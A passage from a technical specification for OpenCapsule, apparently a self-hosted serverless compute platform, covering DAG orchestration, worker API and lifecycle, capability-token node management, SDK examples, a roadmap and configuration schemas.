**Partial results:** For fan-out patterns, completed results are returned even if some branches fail. User code handles partial success.

### 9.7 Example: Map-Reduce Pattern

```json
{
  "orchestration": {
    "mode": "dag",
    "jobs": {
      "split": {
        "code_hash": "blake3:split...",
        "entrypoint": "split.py"
      },
      "map_0": { "depends_on": ["split"], "input_from": "split.chunks[0]", "..." : "..." },
      "map_1": { "depends_on": ["split"], "input_from": "split.chunks[1]", "..." : "..." },
      "map_2": { "depends_on": ["split"], "input_from": "split.chunks[2]", "..." : "..." },
      "map_3": { "depends_on": ["split"], "input_from": "split.chunks[3]", "..." : "..." },
      "reduce": {
        "depends_on": ["map_0", "map_1", "map_2", "map_3"],
        "input_from": ["map_0", "map_1", "map_2", "map_3"],
        "code_hash": "blake3:reduce...",
        "entrypoint": "reduce.py"
      }
    },
    "entry": "split",
    "affinity": {
      "split": "any",
      "map_*": "distributed",
      "reduce": "any"
    }
  }
}
```

```
              +---------+
              |  split  |
              +----+----+
       +------+---+----+------+
       v      v        v      v
   +------++------++------++------+
   |map_0 ||map_1 ||map_2 ||map_3 |  (parallel, distributed)
   +--+---++--+---++--+---++--+---+
       +------+---+----+------+
                  v
              +--------+
              | reduce |
              +--------+
```

---

## 10. Network Topology

### 10.1 HTTP API Architecture

Workers expose an HTTP REST API on a configurable port. Clients connect directly to workers via HTTPS:

```
+-----------------+         +-----------------+
|   Client (SDK)  |         |   Client (CLI)  |
+--------+--------+         +--------+--------+
         |                           |
         | HTTPS                     | HTTPS
         |                           |
         v                           v
+-------------------------------------------+
|              Worker HTTP API              |
+-------------------------------------------+
| POST /v1/jobs       - Submit job          |
| GET  /v1/jobs/:id   - Poll status/result  |
| GET  /v1/jobs/:id/logs - Stream logs      |
| GET  /v1/health      - Health check       |
| GET  /v1/capabilities - Resources/pricing |
| GET  /metrics        - Prometheus metrics |
+-------------------------------------------+
```

### 10.2 Multi-Worker Deployments

For deployments with multiple workers, a load balancer or API gateway routes requests:

```
+-----------------+
|   Client (SDK)  |
+--------+--------+
         |
         | HTTPS
         v
+-------------------+
|   Load Balancer   |
+--------+----------+
         |
    +----+----+----+
    |         |    |
    v         v    v
+--------+ +--------+ +--------+
|Worker A| |Worker B| |Worker C|
+--------+ +--------+ +--------+
```

Workers can be deployed behind any standard HTTP load balancer (nginx, HAProxy, cloud ALB). The load balancer routes based on worker health and capacity.

### 10.3 Worker Lifecycle State Machine

```
                         +----------------+
                         |                |
        Install binary   |  UNREGISTERED  |
       ------------------+                |
                         |                |
                         +-------+--------+
                                 |
                                 | Start worker process
                                 v
                         +----------------+
                         |                |<------------------+
                         |    ONLINE      |                   |
                         | (accepting     |                   |
                         |  jobs)         |                   |
                         +-------+--------+                   |
                                 |                            |
               +-----------------+-----------------+          |
               |                 |                 |          |
               v                 v                 v          |
       +--------------+  +--------------+  +--------------+   |
       |              |  |              |  |              |   |
       |    BUSY      |  |   DRAINING   |  |   OFFLINE    |--+
       | (at capacity)|  | (no new jobs)|  | (connection  |
       |              |  |              |  |    lost)     |
       +--------------+  +--------------+  +--------------+
              |                 |
              |                 | All jobs complete
              |                 v
              |          +--------------+
              |          |              |
              +--------->|   STOPPED    |
                         | (process     |
                         |  exited)     |
                         +--------------+
```

**Worker States:**

| State | Can Accept Jobs | Description |
|-------|-----------------|-------------|
| UNREGISTERED | No | Binary installed, not yet started |
| ONLINE | Yes | Accepting and executing jobs |
| BUSY | No (at capacity) | All job slots occupied |
| DRAINING | No | Finishing active jobs, rejecting new ones |
| OFFLINE | No | Temporarily unreachable |
| STOPPED | No | Process exited cleanly |

**State Transitions:**

| From | To | Trigger |
|------|----|---------|
| UNREGISTERED | ONLINE | Start worker process |
| ONLINE | BUSY | All job slots filled |
| BUSY | ONLINE | Job slot freed |
| ONLINE | DRAINING | Operator initiates shutdown |
| DRAINING | STOPPED | All active jobs complete |
| ONLINE | OFFLINE | Health check timeout |
| OFFLINE | ONLINE | Health check resumes |

### 10.4 Node Configuration

OpenCapsule nodes are managed remotely through a secure API, replacing traditional SSH-based administration. This approach eliminates shell access while providing all necessary operational capabilities.

**Management Architecture:**

```
+-----------------+         +---------------------------------+
|   opencapsulectl   |         |         OpenCapsule Node           |
|   (operator)    |         |                                 |
+--------+--------+         |  +---------------------------+  |
         |                  |  |    Management Daemon       |  |
         | HTTP REST        |  |    (Rust binary)          |  |
         | (encrypted)      |  |                           |  |
         +------------------+--+  - Config validation      |  |
                            |  |  - Lifecycle control      |  |
                            |  |  - Log streaming          |  |
                            |  |  - Metrics export         |  |
                            |  +---------------------------+  |
                            |                                 |
                            |  +---------------------------+  |
                            |  |    Worker Process         |  |
                            |  +---------------------------+  |
                            +---------------------------------+
```

**Capability-Based Authentication:**

Instead of passwords or SSH keys, `opencapsulectl` uses capability tokens derived from a root secret:

```
Root Secret (operator holds)
         |
         +--> Admin Token    (full control)
         |
         +--> Operator Token (lifecycle, config)
         |
         +--> Reader Token   (status, logs only)
```

Token derivation uses HKDF:
```
token = HKDF(root_secret, salt=node_id, info=role)
```

**Key Properties:**
- Tokens are revocable by rotating the root secret
- Tokens are role-scoped (cannot escalate privileges)
- Tokens are node-specific (cannot use on other nodes)
- No shared secrets stored on nodes (derived on-demand)

**Management Commands:**

| Command | Role Required | Description |
|---------|--------------|-------------|
| `opencapsulectl status` | Reader | Show node health and metrics |
| `opencapsulectl logs` | Reader | Stream worker logs |
| `opencapsulectl drain` | Operator | Stop accepting new jobs |
| `opencapsulectl apply` | Operator | Update configuration |
| `opencapsulectl upgrade` | Admin | Stage OS upgrade |
| `opencapsulectl reboot` | Admin | Reboot node |
| `opencapsulectl cap issue` | Admin | Generate new capability token |

**Configuration Flow:**

```
+-----------------+
| 1. Write config |
|    (YAML file)  |
+--------+--------+
         |
         v
+-----------------+     +-----------------+
| 2. opencapsulectl  |---->| 3. Node daemon  |
|    apply        |     |    validates    |
+-----------------+     +--------+--------+
                                 |
                    +------------+------------+
                    v                         v
             +-----------+             +-----------+
             | 4a. Valid |             | 4b. Invalid|
             |  -> Apply |             |  -> Reject |
             +-----------+             +-----------+
```

Configuration is validated before application:
- Schema validation (required fields, types)
- Resource limits (within node capacity)
- Network rules (valid CIDR, ports)

**Remote Upgrade Process:**

OS upgrades are staged and verified before activation:

```
+-----------------+
| 1. Stage image  |
|    (download)   |
+--------+--------+
         |
         v
+-----------------+
| 2. Verify hash  |
|    (SHA256)     |
+--------+--------+
         |
         v
+-----------------+
| 3. Drain jobs   |
|    (graceful)   |
+--------+--------+
         |
         v
+-----------------+
| 4. Switch root  |
|    (atomic)     |
+--------+--------+
         |
         v
+-----------------+
| 5. Reboot       |
|    (verified)   |
+-----------------+
```

If the new image fails to boot, the bootloader automatically reverts to the previous known-good image.

**Log Streaming:**

Operators can stream logs without shell access:

```bash
# Stream all worker logs
opencapsulectl logs --follow

# Filter by severity
opencapsulectl logs --level=error

# Search historical logs
opencapsulectl logs --since=1h --grep="payment"
```

Logs are structured JSON, enabling automated monitoring and alerting.

**Metrics Export:**

Nodes expose Prometheus-compatible metrics via the management API:

```bash
# Fetch current metrics
opencapsulectl metrics

# Continuous export to Prometheus
opencapsulectl metrics --prometheus-push=http://monitor:9091
```

See Appendix D for the complete node configuration schema.

---

## 11. SDK Quick Start

### 11.1 Installation

```bash
# Python
pip install opencapsule-sdk

# TypeScript
npm install @opencapsule/sdk

# Rust
cargo add opencapsule-sdk
```

### 11.2 Simple Function Execution

```python
from opencapsule import Client

client = Client(
    worker_url="https://worker.example.com",
    secret_key="ed25519:...",
    channel_id="my-channel",
    worker_pubkey="ed25519:..."
)

# Execute a simple Python function
result = client.run(
    code="""
def main(data):
    return {"sum": sum(data["numbers"])}
""",
    input={"numbers": [1, 2, 3, 4, 5]},
    resources={"vcpu": 1, "memory_mb": 512}
)

print(result.output)  # {"sum": 15}
print(result.duration_ms)  # 234
```

### 11.3 Dockerfile-Based Jobs

```python
from opencapsule import Client, Manifest

client = Client(
    worker_url="https://worker.example.com",
    secret_key="ed25519:...",
    channel_id="my-channel",
    worker_pubkey="ed25519:..."
)

# Build and run from Dockerfile
result = client.run(
    dockerfile="./Dockerfile",
    manifest=Manifest(
        vcpu=2,
        memory_mb=2048,
        max_duration_ms=60000,
        egress=["api.openai.com", "huggingface.co"]
    ),
    input_file="data.csv"
)

# Stream logs while running
for line in client.logs(result.job_id):
    print(line)

# Fetch result
output = result.download("output.json")
```

### 11.4 Workflow Execution

```python
from opencapsule import Client, DAG

client = Client(
    worker_url="https://worker.example.com",
    secret_key="ed25519:...",
    channel_id="my-channel",
    worker_pubkey="ed25519:..."
)

# Define a map-reduce workflow
workflow = DAG()
workflow.add("fetch", code="fetch.py")
workflow.add("process", code="process.py", depends_on=["fetch"])
workflow.add("summarize", code="summarize.py", depends_on=["process"])

# Execute with automatic dependency resolution
result = client.run_workflow(
    workflow,
    entry="fetch",
    affinity="same_worker"
)

print(result.jobs["summarize"].output)
```

### 11.5 TypeScript Example

```typescript
import { Client } from '@opencapsule/sdk';

const client = new Client({
  workerUrl: 'https://worker.example.com',
  secretKey: 'ed25519:...',
  channelId: 'my-channel',
  workerPubkey: 'ed25519:...',
});

const result = await client.run({
  code: `
    export function main(input: { x: number }) {
      return { squared: input.x ** 2 };
    }
  `,
  input: { x: 42 },
  resources: { vcpu: 1, memoryMb: 512 },
});

console.log(result.output); // { squared: 1764 }
```

### 11.6 SDK Architecture

The SDK handles authentication, encryption, and HTTP communication transparently.

**Client Creation:**
```typescript
import { Client } from '@opencapsule/sdk';

const client = new Client({
  workerUrl: 'https://worker.example.com',
  secretKey: mySecretKey,
  channelId: myChannelId,
  workerPubkey: workerPublicKey,
});
```

**Request Flow:**
1. SDK serializes code and input
2. Derives per-job encryption key from channel key (see Section 7.10)
3. Encrypts code and input with XChaCha20-Poly1305
4. Signs request with Ed25519 secret key
5. Sends HTTP POST to worker
6. Receives encrypted result
7. Decrypts and returns to caller

**Multi-Worker Configuration:**

For deployments with multiple workers, configure the SDK with a load balancer URL or use per-request worker selection:

```typescript
// Single worker
const client = new Client({ workerUrl: 'https://worker-1.example.com', ... });

// Behind load balancer
const client = new Client({ workerUrl: 'https://api.example.com', ... });

// Explicit worker selection per request
const result = await client.run({
  code: '...',
  workerUrl: 'https://worker-2.example.com',  // Override per-request
});
```

---

## 12. Roadmap

### Phase 1: Engine (Q1 2026)
- Single-node worker binary
- HTTP REST API
- Firecracker + Unikraft integration
- End-to-end encrypted job I/O
- Content-addressable build cache

### Phase 2: Platform (Q2 2026)
- Multi-worker deployments
- SDK release (Python, TypeScript, Rust)
- Managed service offering
- DAG workflow orchestration

### Phase 3: Scale (Q3 2026)
- GPU compute support
- Confidential compute tier (TEE)
- Enterprise features (SSO, audit logs, RBAC)
- Geographic multi-region deployments

---

## 13. Technical Stack

| Component | Technology | Purpose |
|-----------|------------|---------|
| HTTP API | Axum | REST API server |
| Compute | Firecracker | MicroVM runtime |
| Unikernels | Unikraft + BuildKit | Dockerfile to minimal kernel |
| Signatures | Ed25519 | Request authentication, identity |
| Encryption | XChaCha20-Poly1305 | End-to-end encrypted job I/O |
| Hashing | BLAKE3 | Content-addressable caching |
| Key Derivation | HKDF-SHA256 | Channel and per-job key derivation |
| Serialization | JSON | API request/response format |

---

## Appendix A: Manifest Schema

```json
{
  "$schema": "https://opencapsule.dev/schemas/manifest-v1.json",
  "version": "1.0",
  "kernel": "python-3.11-unikraft",
  "entrypoint": "main.py",
  "resources": {
    "tier": "standard",
    "vcpu": 2,
    "memory_mb": 2048,
    "max_duration_ms": 60000
  },
  "network": {
    "egress_allowlist": ["api.openai.com", "*.amazonaws.com"]
  },
  "result": {
    "max_size_mb": 50
  },
  "assets": {
    "code": {
      "inline": "<encrypted-base64>"
    },
    "input": {
      "inline": "<encrypted-base64>"
    },
    "files": [
      {
        "path": "/data/model.bin",
        "data": { "inline": "<encrypted-base64>" }
      }
    ],
    "compression": "none"
  }
}
```

## Appendix B: Orchestration Schema

```json
{
  "orchestration": {
    "mode": "dag",

    "dag": {
      "jobs": {
        "<job_id>": {
          "code_hash": "blake3:...",
          "deps_hash": "blake3:...",
          "entrypoint": "main.py",
          "resources": {
            "vcpu": 2,
            "memory_mb": 2048,
            "max_duration_ms": 60000
          },
          "depends_on": ["<parent_job_id>"],
          "input_from": "<parent_job_id> | <parent_job_id>.field"
        }
      },
      "entry": "<starting_job_id>",
      "affinity": {
        "default": "same_worker | same_region | distributed",
        "<job_id>": "same_worker | same_region | distributed"
      }
    },

    "spawn_limits": {
      "max_depth": 3,
      "max_total_jobs": 50,
      "max_spawn_budget": 10.0
    }
  }
}
```

## Appendix C: Migration from AWS Lambda

| AWS Lambda Concept | OpenCapsule Equivalent |
|--------------------|---------------------|
| `handler.py` / handler function | `entrypoint` in manifest |
| `requirements.txt` | `RUN pip install` in Dockerfile |
| Event JSON | Input data (via `input` field) |
| Return value | stdout or result data |
| Environment variables | Build-time `ARG` in Dockerfile |
| VPC / Security Groups | `egress_allowlist` in manifest |
| Layers | Multi-stage Dockerfile + L2 cache |
| Provisioned Concurrency | Pre-warmed workers (same effect via caching) |
| Step Functions | DAG orchestration mode |
| CloudWatch Logs | stdout/stderr in result |

**Key Differences:**

1. **No runtime package installation.** All dependencies must be in the Dockerfile. This is more secure but requires upfront declaration.

2. **No persistent filesystem.** Jobs are stateless. Use input/output for data passing.

3. **Explicit network allowlist.** Unlike Lambda VPCs which allow all egress by default, OpenCapsule blocks all egress unless explicitly allowlisted.

4. **Self-hosted.** You run the worker on your own infrastructure. No cloud vendor lock-in.

**Example Migration:**

```python
# AWS Lambda
def handler(event, context):
    import pandas as pd
    df = pd.read_csv(event['s3_path'])
    return {"row_count": len(df)}

# OpenCapsule Dockerfile
FROM python:3.11-slim-unikraft
RUN pip install pandas
COPY handler.py /app/
CMD ["python", "/app/handler.py"]

# OpenCapsule handler.py
import json
import pandas as pd

def main():
    with open("/input/data.csv") as f:
        df = pd.read_csv(f)
    print(json.dumps({"row_count": len(df)}))

if __name__ == "__main__":
    main()
```

## Appendix D: Node Configuration Schema

Complete TOML schema for OpenCapsule node configuration, managed via `opencapsulectl apply`.

```toml
# node-config.toml
# OpenCapsule Node Configuration Schema v1.0

# Schema version (required)
version = "1.0"

# Node identity
[node]
# Human-readable name (optional, for operator reference)
name = "worker-us-west-01"

# Resource allocation
[resources]
# Maximum vCPUs available for jobs
max_vcpu = 16
# Maximum memory in MB
max_memory_mb = 65536
# Maximum concurrent jobs
max_concurrent_jobs = 8
# Supported job tiers
tiers = ["standard", "compute"]

# Pricing (configurable by operator)
[pricing]
# Per vCPU-millisecond
cpu_ms = 1
# Per MB-millisecond of memory
memory_mb_ms = 0.1
# Per MB of egress
egress_mb = 10000

# HTTP API configuration
[api]
# Listen address for the job API
listen = "0.0.0.0:8080"
# Listen address for the management API
management_listen = "127.0.0.1:9090"
# Listen address for Prometheus metrics
metrics_listen = "0.0.0.0:9091"

# TLS configuration
[api.tls]
# Enable TLS (recommended for production)
enabled = true
# Certificate path
cert_path = "/etc/opencapsule/tls/cert.pem"
# Key path
key_path = "/etc/opencapsule/tls/key.pem"

# Firecracker MicroVM configuration
[vmm]
# Path to kernel binary
kernel_path = "/var/lib/opencapsule/vmlinux"
# Default rootfs for unikernels
rootfs_path = "/var/lib/opencapsule/rootfs.ext4"
# VM boot timeout in milliseconds
boot_timeout_ms = 5000
# Enable jailer for additional isolation
jailer_enabled = true
# Jailer UID/GID range start
jailer_uid_start = 10000

# Builder VM configuration
[builder]
# Enable ephemeral builder VMs
enabled = true
# Builder timeout in seconds
timeout_seconds = 300
# Maximum builder memory in MB
max_memory_mb = 4096
# Maximum builder disk in MB
max_disk_mb = 10240

# Cache configuration
[cache]
# Local cache directory
path = "/var/cache/opencapsule"
# Maximum cache size in GB
max_size_gb = 100
# Cache TTL in hours (0 = infinite)
ttl_hours = 168  # 7 days

# Logging configuration
[logging]
# Log level: trace, debug, info, warn, error
level = "info"
# Log format: json, pretty
format = "json"
# Log output: stdout, file, both
output = "both"
# Log file path (if output includes file)
file_path = "/var/log/opencapsule/worker.log"

# Log rotation
[logging.rotation]
max_size_mb = 100
max_files = 10

# Security configuration
[security]
# Require TLS for management API
tls_required = true

# Capability token settings
[security.capability]
# Token expiry in hours (0 = no expiry)
expiry_hours = 720  # 30 days
# Allowed roles
allowed_roles = ["admin", "operator", "reader"]

# Attestation configuration (for hardened nodes)
[attestation]
# Enable TPM-based attestation
tpm_enabled = true
# TPM device path
tpm_device = "/dev/tpmrm0"
# Enable dm-verity verification
verity_enabled = true
# Expected dm-verity root hash (set during build)
# verity_root_hash = "sha256:..."

# Maintenance windows
[maintenance]
# Automatic updates enabled
auto_update = false
# Drain timeout before forced shutdown (seconds)
drain_timeout = 300

# Preferred update window (UTC)
[maintenance.update_window]
start = "04:00"
end = "06:00"
```

**Configuration Validation Rules:**

| Field | Validation |
|-------|------------|
| `version` | Must be "1.0" |
| `resources.max_vcpu` | 1-128, must not exceed host CPU count |
| `resources.max_memory_mb` | 512-524288, must not exceed host RAM |
| `pricing.*` | Non-negative integers |
| `api.listen` | Valid socket address |
| `vmm.boot_timeout_ms` | 1000-30000 |
| `cache.max_size_gb` | 1-1000 |
| `logging.level` | One of: trace, debug, info, warn, error |

**Example: Minimal Configuration**

```toml
version = "1.0"

[node]
name = "my-worker"

[resources]
max_vcpu = 8
max_memory_mb = 32768

[pricing]
cpu_ms = 1
memory_mb_ms = 0.1
egress_mb = 10000
```

All other fields use secure defaults when not specified.

---

*For technical questions: developers@opencapsule.dev*
*For partnerships: partners@opencapsule.dev*
